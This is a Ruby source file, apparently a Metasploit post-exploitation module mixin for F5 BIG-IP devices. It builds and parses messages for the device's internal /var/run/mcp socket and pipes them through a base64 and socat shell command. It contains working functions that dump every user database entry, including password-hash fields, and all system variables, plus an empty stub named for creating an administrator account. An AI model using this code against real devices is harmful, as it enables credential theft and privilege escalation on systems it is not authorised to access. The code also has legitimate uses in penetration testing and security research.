# Encoding: ASCII-8BIT

module Msf
  class Post
    module Linux
      # The F5 mixin implements methods for querying F5's database, which
      # is found at `/var/run/mcp` on Big-IP and other F5 devices
      module F5

        def initialize(info = {})
          super(info)

          # This is a subset of all possible objects:
          # https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-objects.txt
          @tags_by_name = {
            # Types
            'byte' => 0x0001,
            'bits' => 0x0002,
            'uword' => 0x0003,
            'long' => 0x0004,
            'ulong' => 0x0005,
            'uquad' => 0x0006,
            'ip_address_old' => 0x0007,
            'service' => 0x0008,
            'mac' => 0x0009,
            'date' => 0x000a,
            'time' => 0x000b,
            'tag' => 0x000c,
            'structure' => 0x000d,
            'array' => 0x000e,
            'string' => 0x000f,
            'blob' => 0x0010,
            'ptr' => 0x0011,
            'double' => 0x0012,

            # Query types
            'query' => 0x0b64,
            'query_all' => 0x0b65,
            'query_reply' => 0x0b68,

            # User types
            'userdb_entry' => 0x0b11,
            'userdb_entry_name' => 0x0b12,
            'userdb_entry_passwd' => 0x0b13,
            'userdb_entry_is_crypted' => 0x0b14,
            'userdb_entry_gecos' => 0x0b15,
            'userdb_entry_uid' => 0x0b16,
            'userdb_entry_gid' => 0x0b17,
            'userdb_entry_homedir' => 0x0b18,
            'userdb_entry_shell' => 0x0b19,
            'userdb_entry_role' => 0x0b1a,
            'userdb_entry_mark' => 0x0b1b,
            'userdb_entry_dirty_cnt' => 0x0b1c,
            'userdb_entry_object_id' => 0x0b1d,
            'userdb_entry_attributes' => 0x0b1e,
            'userdb_entry_validate_checkpoint' => 0x0b1f,
            'userdb_entry_validate_commit' => 0x0b20,
            'userdb_entry_user_role' => 0x0f8c,
            'userdb_entry_oldpasswd' => 0x1027,
            'userdb_entry_is_system' => 0x115f,
            'userdb_entry_partition_id' => 0x1fc9,
            'userdb_entry_description' => 0x2ad3,
            'userdb_entry_app_id' => 0x2ad4,
            'userdb_entry_strict_app_updates' => 0x2ad5,
            'userdb_entry_transaction_id' => 0x5116,
            'userdb_entry_session_limit' => 0xa081,

            # Database variable types
            'db_variable' => 0x084a,
            'db_variable_name' => 0x084b,
            'db_variable_display_name' => 0x084c,
            'db_variable_value' => 0x084d,
            'db_variable_default' => 0x084e,
            'db_variable_sync_type' => 0x084f,
            'db_variable_data_type' => 0x0850,
            'db_variable_minimum' => 0x0851,
            'db_variable_maximum' => 0x0852,
            'db_variable_enumerated' => 0x0853,
            'db_variable_mark' => 0x0854,
            'db_variable_dirty_cnt' => 0x0855,
            'db_variable_object_id' => 0x0856,
            'db_variable_validate_checkpoint' => 0x0857,
            'db_variable_validate_commit' => 0x0858,
            'db_variable_attributes' => 0x0859,
            'db_restore_info' => 0x108d,
            'db_restore_info_object_id' => 0x108e,
            'db_restore_info_last_object_id' => 0x108f,
            'db_restore_info_dossier' => 0x10b2,
            'db_variable_transaction_id' => 0x118f,
            'db_variable_scf_config' => 0x2874,
            'db_variable_app_id' => 0x2875,
            'db_variable_strict_app_updates' => 0x2876,
          }

          @tags_by_id = tags_by_name.invert()
        end

        def mcp_send_recv(data)
          # if !file_exist?('/var/run/mcp')
          #   print_warning("Socket /var/run/mcp doesn't exist, probably not a supported host")
          #   return nil
          # end

          # Add a header
          message = [data.length, 0, 0, 0, data].pack('NNNNa*')

          # Encode as base64 so we can pass it on the commandline
          message = Rex::Text.encode_base64(message)

          # Send
          result = cmd_exec("echo '#{message}' | base64 -d | socat -t100 - UNIX-CONNECT:/var/run/mcp")

          if !result || result == ''
            print_warning('Request to /var/run/mcp socket failed')
            return nil
          end

          results = []
          while result.length > 0
            length, header, result = result.unpack('Na12a*')
            packet, result = result.unpack("a#{ length }a*")
            results << mcp_parse(packet)
          end

          results
        end

        # Parse an mcp message from a binary stream into an object
        # Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-parser.rb
        def mcp_parse(stream)
          result = []

          begin
            while stream.length > 2
              tag, type, stream = stream.unpack('nna*')

              tag  = @tags_by_id[tag]  || "<unknown 0x%04x>" % tag
              type = @tags_by_id[type] || "<unknown 0x%04x>" % type

              if type == 'structure'
                # Get the length and struct data, then recurse
                length, stream = stream.unpack('Na*')
                struct, stream = stream.unpack("a#{ length }a*")

                result << {
                  tag: tag,
                  value: mcp_parse(struct)
                }
              elsif type == 'string'
                length, otherlength, stream = stream.unpack('Nna*')

                # I'm sure the two length values have a semantic difference, but just check for sanity
                if otherlength + 2 != length
                  raise "Inconsistent string lengths: #{ length } + #{ otherlength }"
                end

                str, stream = stream.unpack("a#{ otherlength }a*")
                result << {
                  tag: tag,
                  value: str
                }
              elsif type == 'uquad'
                value, stream = stream.unpack('Q>a*')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'ulong'
                value, stream = stream.unpack('Na*')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'time'
                value, stream = stream.unpack('Na*')
                result << {
                  tag: tag,
                  value: Time.at(value)
                }
              elsif type == 'uword'
                value, stream = stream.unpack('na*')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'long'
                value, stream = stream.unpack('Na*')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'tag'
                value_tag, stream = stream.unpack('na*')
                result << {
                  tag: tag,
                  value: @tags_by_id[value_tag]
                }
              elsif type == 'byte'
                value, stream = stream.unpack('Ca*')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'mac'
                value, stream = stream.unpack('a6a*')
                value = value.bytes.map { |b| '%02x' % b }.join(':')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'array'
                length, stream = stream.unpack('Na*')
                array, stream = stream.unpack("a#{ length }a*")

                result << {
                  tag: tag,
                  value: "Array data: #{array.unpack('H*').pop}"
                }
              else
                raise "Unknown type: #{ type }"
                return
              end
            end
          rescue StandardError => e
            print_error(e.message)
            return nil
          end

          result
        end

        # Build an mcp message
        # Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-builder.rb
        def mcp_build(tag, type, data)
          if @tags_by_name[tag].nil?
            raise "Invalid tag: #{ tag }"
          end
          if @tags_by_name[type].nil?
            raise "Invalid type: #{ type }"
          end

          out = ''
          if type == 'structure'
            out = [data.join.length, data.join].pack('Na*')

            # while (out.length % 4) != 0
            #   out += "\0"
            # end
          elsif type == 'string'
            out = [data.length + 2, data.length, data].pack('Nna*')
          elsif type == 'uquad'
            out = [data].pack('Q>')
          elsif type == 'ulong'
            out = [data].pack('N')
          elsif type == 'uword'
            out = [data].pack('n')
          elsif type == 'long'
            out = [data].pack('N')
          elsif type == 'tag'
            out = [@tags_by_name[data]].pack('n')
          elsif type == 'byte'
            out = [data].pack('C')
          elsif type == 'mac'
            out = [data].pack('a6')
          else
            raise "Unknown type: #{ type }"
          end

          out = [@tags_by_name[tag], @tags_by_name[type], out].pack('nna*')

          return out
        end

        # Query the mcp socket for a list of users
        # Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb
        def mcp_query_all_users()
          # Get the raw result
          result = mcp_send_recv(
            mcp_build('query_all', 'structure', [
              mcp_build('userdb_entry', 'structure', [])
            ])
          )

          # There should only be one response
          if result.length != 1
            print_error("Invalid response returned by mcp: more than one message reply")
            return nil
          end
          result = result.pop

          # There should only be one query result
          if result.length != 1
            print_error("Invalid response returned by mcp: more than one query result")
            return nil
          end
          result = result.pop

          unless result[:tag] == 'query_reply'
            print_error("Invalid tag returned by mcp")
            return nil
          end

          # We only care about the response
          result = result[:value]

          # Structure it into a more sensible format
          result = result.map do |single_result|
            single_result[:value].map do |r|
              [r[:tag], r[:value]]
            end.to_h
          end

          result
        end

        # Query the mcp socket for a list of settings
        # Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb
        def mcp_query_all_db_variable()
          mcp_send_recv(
            mcp_build('query_all', 'structure', [
              mcp_build('db_variable', 'structure', [])
            ])
          )
        end

        # Create an administrative user
        # Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-privesc.rb
        def query_mcp_create_user()
        end
      end
    end
  end
end




